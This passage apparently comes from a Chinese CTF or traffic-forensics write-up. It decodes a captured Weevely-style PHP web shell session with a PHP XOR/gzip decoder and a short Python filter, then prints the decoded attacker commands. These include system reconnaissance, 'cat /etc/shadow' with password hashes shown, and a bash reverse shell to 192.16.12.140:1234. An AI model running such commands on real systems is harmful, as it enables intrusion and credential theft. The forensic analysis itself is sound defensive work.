<span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">              <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpinput</span> = <span class="string">&quot;kbPze6iWSynLVEi5a0b923820dccG6iwTn8e4RdMG7SuHPv+OWMVTWXF509a6f75849b</span></span><br><span class="line"><span class="string">&quot;</span>; <span class="comment">// HTTP POST data  //替换数据即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$phpinput</span>, <span class="variable">$m</span>) == <span class="number">1</span>) &#123; <span class="comment">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$phpcode</span> = @gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)); <span class="comment">// gunzip(XOR(b64decode(data), key))</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$phpcode</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_start(); // Turn on output buffering</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>($phpcode); // Executes PHP code</span></span><br><span class="line"><span class="comment">    $o = <span class="doctag">@ob</span>_get_contents(); // Save stdout to $o</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_end_clean(); // Clean (erase) the output buffer and turn off output buffering</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    $r = <span class="doctag">@base</span>64_encode(<span class="doctag">@x</span>(<span class="doctag">@gzcompress</span>($o), $k)); // b64encode(XOR(gzip(stdout)), key)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    print(&quot;$p$kh$r$kf&quot;); // HTTP Response data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用这个脚本，先将所有相关的都提出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = a.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;zYgIi?&#123;4d\&gt;;=h&#x27;=&quot;</span> <span class="keyword">in</span> a[i]:</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span> <span class="keyword">in</span> a[i]:</span><br><span class="line">        <span class="built_in">print</span>(a[i])</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>这边为了方便直接解除所有的内容```</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$k</span> = <span class="string">&quot;c4ca4238&quot;</span>; <span class="comment">// FIRST PART: 8 first chars</span></span><br><span class="line"><span class="variable">$kh</span> = <span class="string">&quot;a0b923820dcc&quot;</span>; <span class="comment">// SECOND PART: 12 next chars</span></span><br><span class="line"><span class="variable">$kf</span> = <span class="string">&quot;509a6f75849b&quot;</span>; <span class="comment">// THIRD PART: 12 last chars</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;kbPze6iWSynLVEi5&quot;</span>; <span class="comment">// Random data (?)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// $k=c4ca4238</span></span><br><span class="line"><span class="comment">// p=kbPze6iWSynLVEi5   kh=a0b923820dcc   r=G6hIr/gf+3FmNGpnNrk=  kf=509a6f75849b</span></span><br><span class="line"><span class="comment">// User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.9) Gecko/20061215 Red Hat/1.5.0.9-0.1.el4 Firefox/1.5.0.9</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --009f0c02-C--</span></span><br><span class="line"><span class="comment">// zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhh0QqfhIsER6fBWq/ExP/Xn/dbbkt9UyMmTZbH0509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="comment">//   p kh</span></span><br><span class="line"><span class="comment">// kbPze6iWSynLVEi5a0b923820dccG6hIr/gf+3FmNGpnNrk=509a6f75849b</span></span><br><span class="line"><span class="comment">// p=kbPze6iWSynLVEi5   kh=a0b923820dcc   r=G6hIr/gf+3FmNGpnNrk=  kf=509a6f75849b</span></span><br><span class="line"><span class="comment">//1 c4ca4238a0b923820dcc509a6f75849b</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>, <span class="variable">$k</span></span>) </span>&#123; <span class="comment">// XOR</span></span><br><span class="line">    <span class="variable">$c</span> = strlen(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span> = strlen(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span> = <span class="number">0</span>; (<span class="variable">$j</span> &lt; <span class="variable">$c</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="variable">$l</span>); <span class="variable">$j</span>++, <span class="variable">$i</span>++) &#123;</span><br><span class="line">              <span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpinput</span> = <span class="string">&quot;zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6goLPr65AhWAlXS5IY1OHTFYFQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hQVAIEgDhjN3RgPg==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhkUQzRhNKPnnY3cu+qs2BIOHiFNntNUyMn84bsU509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hQ0ICCA9thNGc4NSw=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhh0QqfhIsER6fBWq/ExP/Xn/dbbkt9UyMmTZbH0509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hIr/gf+3FmNGpnNrk=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gO7HU48BhzcUxCRe5GF2bbMuvsRCE+z/6L1bXQ7rONNrqfwyzsGRBSrDkGBXkjP7jGdJzIVLBSCEHjGovh1lRYhkrA4FVhrQUtC0p4nda7tFgpVNS6qooe2ogg7JvX1VfPWYITlTcLnavyLek4awkX0Zw7+m154g509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6goTXx+/XBmNGs/NlE=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gQKRkY+RfpGylM/B0Z8a9/tFHkhkVwrXyqTeZi5Gu0YDBKHPj/E7JEKy4Zex13suS31TIyjOdzvw509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iwTn8e4RdMG7SuHPv+OWMVTWXF509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5xVlRB77cp4NqcyONKnd8Y509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hIrHiDBomzfE8pePx77Td8JIIi16QudxfqETUyTeNsQQ==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5yl1R2FkkmJEhgr4cotYXQ3Mg9sdao509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iQqPgZnmhL+q9M/HtmCLUHV7EH4gaLV+JQtAfgePVS48jRBLkECzJkVTU8xD5oEx+pNcR9HWlTBmNDH1EQEzA35rEkVRP/s2hiyyCnQc9o4ZRg7fM2OID/eMI=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wVFK5L3MT3ENlYLcbSx0deGyvhyi1hVDUyMJZ6HQ509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6ju8GV98Qhz87yaHagN+eAvJ/It/i1+tPwXOqOEAMnK9RKhJpaXI627DHAku6vIt3+Nlsvv1nIC6RHo50iOxaciNVFZMjTm/gNvZ8OKdLXmCiVQ7MgwXhtarloinKt0OPi1TOy/nmUDKxRQ6KFVU0jcwF3+anvQTAkiTnj6t99CPW0HtqALHPa3L9KfR6kE2KA+oz79Ul6PwETFQ1ZzaEKsMc7OnS2nx2VNcnlL+X0rMmzWd7Bb+W2lCWIX7b/OULvsknpK9UxK5vNN70TgtB+LiFtb7cS0Psxn7P91HmCisVlm64S43v9w94S+ea592n6HOd1wwx8l4RKCLwXDJyer7SWkUsIcMW71pMNmtPyG+hHd7NfNoWHlyB/MCNnKkuR0p9ydyQ==509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5zVJxOL0kuJk6QX03RTR8fQpRggup16Y0EzMyWnLdE509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6iwTB6dG+q2MUFkd7eRxJ8mawBdWpfY8a7PwVSQU1AJUQ/JlK1pqs9r//CsoGz2ZjTw6js4509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wVFK5L3MT3ENkkX0eSh/YfKuqRejaWYTTchSEx509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6gW83VFkQhztIycI0/8691jViE1QYBT/J+3xKKYHo8jturlEKCDrJ3ODhZPW7cBHeuv+v1WWRFuKJrC2n+ACbuUMv3aJYwmIyaNr5oFdE8sj0Tsp1QRH69/X/LOzE8i9VrUCNptOmXpxD7UXoFtHdQHUKdTLq527SfCE8+J/qK2Xfi+msX9LOHkElwMt4D34zXnkR5RMcbj9BRi04nzsDdGo0BoxziWmY2NJQpSW1vTWGR7ZfZ+h8okgJxyGGEbQN8dGnAn4sXJBGCyP6t65G6YgW6W3jUNJQbmgMEHN7l0jpM+aNOf6VVn8fb4bpcivqfKLPXsX5RWicu3mGCvRP1kfzDFygvOPL4gVe2s+WlTMUc/sHMd4GeYcVt7PCmwkRXtbrMmlNEQ9SheW+/RNsRZMtH4ccSXpnqNiVar/ZqWRviaqmyk2egGW2PbSYGXHbbMj+IVWHtJSEDpXVdu4lAq6q1NcV9k+LsWuQSlb+50mzds4yXG/+xv18pdH3ZfsJ6wBsot/QScP0HkRnhfwnQDApLF509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6hu7f84sxhzNBykZ71wlQglJ3HJe1txaQkH9JCNXBcQLOW46NyaEoLhZ1hTQtoCqE45TeVxGOGTZJGWZXtFyej9PX0vTbDpsr2l6o2y7obzgmNZniS0LvqJZzVpHddkw2RvH8q3VCfc509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hgYTQyMzk=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6gor3z7H+oz40wqGOAcF0zjrEn9/2Lv10IrTB74HLJMfk6pGxj69CjjU2G+J2Qu9JCFC5wlMz13QPB0uCY/Fe7Ab6wYxj+5973i46WvqRkzB2PY3CtU509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6juLnmZ8QhziJQ2+HdjiCqCt5k1D/iDX+pc8ex0OqLVQvSTyMUF2iZ7/RdCquqhns+avLeEthrYZVfs5lLNhkyE0ZJ5i/PJTaqy/OQKQhLQ0ehYOW/PgNJ3ywJLUkyTaxa0CyZ5u4ZRXj47cMzlZd+NKvhBAFRB/UvVj3dJNbPw9HEL8hb6Mpea3RlV+tNi7XWnVn8mK0SO9/vRrY8HgBX4qAY6+isLpjhB6ZXnXQSI3J0UWM67Mqwr1zBvEK4iRngV9L4PM1njaRc=509a6f75849b</span></span><br><span class="line"><span class="string">zYgIi?&#123;4d\&gt;;=h&#x27;=a0b923820dccG6hu7X84sxh3NMyDfl9i9wQlJnHpFvkc5kpfRN3EiqHibe8QrxUa2D48MSvU0EqwAaxPsHkB6t/F3Mw8nu7xL8EJxjmj0mvRuvwC0ht2wDiVjqHXnwKYaeOODfkuCwGl8ktclXksUw509a6f75849b2&#125;Zb&amp;G6y+(+]3VCr</span></span><br><span class="line"><span class="string">kbPze6iWSynLVEi5a0b923820dccG6hgYTQyMzk=509a6f75849b&quot;</span>;</span><br><span class="line"><span class="variable">$phpinput</span> = explode(<span class="string">&quot;\n&quot;</span>, <span class="variable">$phpinput</span>);<span class="comment">// HTTP POST data</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$arrlength</span>=count(<span class="variable">$phpinput</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$arrlength</span>;<span class="variable">$x</span>++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (@preg_match(<span class="string">&quot;/<span class="subst">$kh</span>(.+)<span class="subst">$kf</span>/&quot;</span>, <span class="variable">$phpinput</span>[<span class="variable">$x</span>], <span class="variable">$m</span>) == <span class="number">1</span>) &#123; <span class="comment">// if $kh and $kf exist in php://input, store matches in array $m; if debugged with print_r($m) you will notice that $m[0] is $kh + b64data + $kf and $m[1] is b64data only</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$phpcode</span> = @gzuncompress(@x(@base64_decode(<span class="variable">$m</span>[<span class="number">1</span>]), <span class="variable">$k</span>)); <span class="comment">// gunzip(XOR(b64decode(data), key))</span></span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$phpcode</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_start(); // Turn on output buffering</span></span><br><span class="line"><span class="comment">    <span class="doctag">@eval</span>($phpcode); // Executes PHP code</span></span><br><span class="line"><span class="comment">    $o = <span class="doctag">@ob</span>_get_contents(); // Save stdout to $o</span></span><br><span class="line"><span class="comment">    <span class="doctag">@ob</span>_end_clean(); // Clean (erase) the output buffer and turn off output buffering</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    $r = <span class="doctag">@base</span>64_encode(<span class="doctag">@x</span>(<span class="doctag">@gzcompress</span>($o), $k)); // b64encode(XOR(gzip(stdout)), key)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    print(&quot;$p$kh$r$kf&quot;); // HTTP Response data</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">echo</span>(<span class="number">53368</span>);<span class="number">53368</span>@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;echo 49886&#x27;</span>);<span class="number">49886</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);<span class="keyword">print</span>(@gethostname());simple@error_reporting(<span class="number">0</span>);<span class="keyword">if</span>(is_callable(<span class="string">&#x27;posix_getpwuid&#x27;</span>)&amp;&amp;is_callable(<span class="string">&#x27;posix_geteuid&#x27;</span>))&#123;<span class="variable">$u</span>=@posix_getpwuid(@posix_geteuid());<span class="keyword">if</span>(<span class="variable">$u</span>)&#123;<span class="variable">$u</span>=<span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>];&#125;<span class="keyword">else</span>&#123;<span class="variable">$u</span>=getenv(<span class="string">&#x27;username&#x27;</span>);&#125;<span class="keyword">print</span>(<span class="variable">$u</span>);&#125;apache@error_reporting(<span class="number">0</span>);@chdir(<span class="string">&#x27;.&#x27;</span>)&amp;&amp;<span class="keyword">print</span>(@getcwd());/<span class="keyword">var</span>/www/htmlchdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;id 2&gt;&amp;1&#x27;</span>);uid=<span class="number">48</span>(apache) gid=<span class="number">48</span>(apache) groups=<span class="number">48</span>(apache)      </span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;uname -a 2&gt;&amp;1&#x27;</span>);Linux simple <span class="number">3.10</span>.<span class="number">0</span>-<span class="number">693.5</span>.<span class="number">2</span>.el7.x86_64 <span class="comment">#1 SMP Fri Oct 20 20:32:50 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;cat /etc/*relea* 2&gt;&amp;1&#x27;</span>);CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">Derived <span class="keyword">from</span> Red Hat Enterprise Linux <span class="number">7.4</span> (Source)</span><br><span class="line">NAME=<span class="string">&quot;CentOS Linux&quot;</span></span><br><span class="line">VERSION=<span class="string">&quot;7 (Core)&quot;</span></span><br><span class="line">ID=<span class="string">&quot;centos&quot;</span></span><br><span class="line">ID_LIKE=<span class="string">&quot;rhel fedora&quot;</span></span><br><span class="line">VERSION_ID=<span class="string">&quot;7&quot;</span></span><br><span class="line">PRETTY_NAME=<span class="string">&quot;CentOS Linux 7 (Core)&quot;</span></span><br><span class="line">ANSI_COLOR=<span class="string">&quot;0;31&quot;</span></span><br><span class="line">CPE_NAME=<span class="string">&quot;cpe:/o:centos:centos:7&quot;</span></span><br><span class="line">HOME_URL=<span class="string">&quot;https://www.centos.org/&quot;</span></span><br><span class="line">BUG_REPORT_URL=<span class="string">&quot;https://bugs.centos.org/&quot;</span></span><br><span class="line"></span><br><span class="line">CENTOS_MANTISBT_PROJECT=<span class="string">&quot;CentOS-7&quot;</span></span><br><span class="line">CENTOS_MANTISBT_PROJECT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT=<span class="string">&quot;centos&quot;</span></span><br><span class="line">REDHAT_SUPPORT_PRODUCT_VERSION=<span class="string">&quot;7&quot;</span></span><br><span class="line"></span><br><span class="line">CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">CentOS Linux release <span class="number">7.4</span>.<span class="number">1708</span> (Core)</span><br><span class="line">cpe:/o:centos:centos:<span class="number">7</span></span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;ls -l /etc/shadow 2&gt;&amp;1&#x27;</span>);-rwxr--r-- <span class="number">1</span> root root <span class="number">912</span> Dec  <span class="number">4</span> <span class="number">15</span>:<span class="number">31</span> /etc/shadow</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;cat /etc/shadow 2&gt;&amp;1&#x27;</span>);root:$<span class="number">6</span><span class="variable">$yxsi</span>.<span class="number">1</span>Ma<span class="variable">$OZVDHL1S8Uq34AaBRURsdSu</span>/o/i4S4tZ66A08k3yMuEYehGn8zpwpMJIS59t.dqdKjj22KakQNwbuIjQc5JV20:<span class="number">18234</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">bin:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">daemon:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">adm:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">lp:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">sync:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">shutdown:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">halt:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">mail:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">operator:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">games:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">ftp:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">nobody:*:<span class="number">16372</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">avahi-autoipd:!!:<span class="number">17483</span>::::::</span><br><span class="line">dbus:!!:<span class="number">17483</span>::::::</span><br><span class="line">polkitd:!!:<span class="number">17483</span>::::::</span><br><span class="line">tss:!!:<span class="number">17483</span>::::::</span><br><span class="line">postfix:!!:<span class="number">17483</span>::::::</span><br><span class="line">sshd:!!:<span class="number">17483</span>::::::</span><br><span class="line">simple:$<span class="number">6</span><span class="variable">$OKhnPP</span>.<span class="number">6</span>XfWK/Qjk$<span class="number">701</span>eOD87cni/<span class="number">1</span>IShASWs1nkLOOWWZdZZTflk6cw3fBdZwffib4aEYfUoUhDGZ9KJGQc64sJk8XptdK1zVeVmC1:<span class="number">17483</span>:<span class="number">0</span>:<span class="number">99999</span>:<span class="number">7</span>:::</span><br><span class="line">systemd-network:!!:<span class="number">17483</span>::::::</span><br><span class="line">geoclue:!!:<span class="number">17483</span>::::::</span><br><span class="line">rtkit:!!:<span class="number">17483</span>::::::</span><br><span class="line">colord:!!:<span class="number">17483</span>::::::</span><br><span class="line">pulse:!!:<span class="number">17483</span>::::::</span><br><span class="line">gdm:!!:<span class="number">17483</span>::::::</span><br><span class="line">chrony:!!:<span class="number">17483</span>::::::</span><br><span class="line">mysql:!!:<span class="number">17946</span>::::::</span><br><span class="line">apache:!!:<span class="number">17946</span>::::::</span><br><span class="line">chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;/bin/bash -i &gt;&amp;/dev/tcp/192.16.12.140/1234 0&gt;&amp;1 2&gt;&amp;1&#x27;</span>);chdir(<span class="string">&#x27;/var/www/html&#x27;</span>);@error_reporting(<span class="number">0</span>);@system(<span class="string">&#x27;ping -c 2 192.168.12.140 2&gt;&amp;1&#x27;</span>);PING <span class="number">192.168</span>.<span class="number">12.140</span> (<span class="number">192.168</span>.<span class="number">12.140</span>) <span class="number">56</span>(<span class="number">84</span>) bytes of data.</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">12.140</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">64</span> time=<span class="number">0.746</span> ms</span><br><span class="line"><span class="number">64</span> bytes <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">12.140</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">64</span> time=<span class="number">1.07</span> ms</span><br><span class="line"></span><br><span class="line">--- <span class="number">192.168</span>.<span class="number">12.140</span> ping statistics ---</span><br><span class="line"><span class="number">2</span> packets transmitted, <span class="number">2</span> received, <span class="number">0</span>% packet loss, 